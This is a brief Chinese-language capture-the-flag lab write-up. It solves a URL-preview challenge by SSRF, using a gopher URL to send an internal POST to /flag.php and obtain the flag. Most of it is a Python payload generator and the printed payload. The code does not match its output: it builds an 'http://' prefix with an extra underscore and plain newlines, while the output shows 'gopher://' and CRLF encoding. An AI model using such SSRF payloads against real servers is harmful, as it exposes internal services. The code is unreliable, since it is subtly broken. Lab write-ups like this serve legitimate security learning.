# lab_previewcard

1. 這題可以看到一個頁面，能夠送入一段網址，然後下面 Preview Card 會顯示內容，Debug 會輸出 Response。

![截圖 2023-01-05 下午2.41.23.png](lab_previewcard%209ee8880bc09545dcb2b9728a4fa14810/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258B%25E5%258D%25882.41.23.png)

1. 然後我們這邊直接按照提示，使用 gopher 協議去構造一段 URL 來進行 SSRF。直接先使用 python 去將要 Request 的內容寫入 test，然後使用 urlencode(test) ，在 python3 中是 urllib.parse.quote，所以這邊 payload 會是 gopher + 1 byte padding + urlencode(test) 生成的 payload，然後將得到的輸出，在網站中送入，就可以得到 FLAG。

```python
import urllib.parse

test = """POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

givemeflag=yes
"""

gopher = "http://127.0.0.1:80/_"

payload = gopher + "_" + urllib.parse.quote(test)
print(payload)
```

```
gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2014%0D%0A%0D%0Agivemeflag%3Dyes%0D%0A
```

![截圖 2023-01-05 下午3.10.16.png](lab_previewcard%209ee8880bc09545dcb2b9728a4fa14810/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258B%25E5%258D%25883.10.16.png)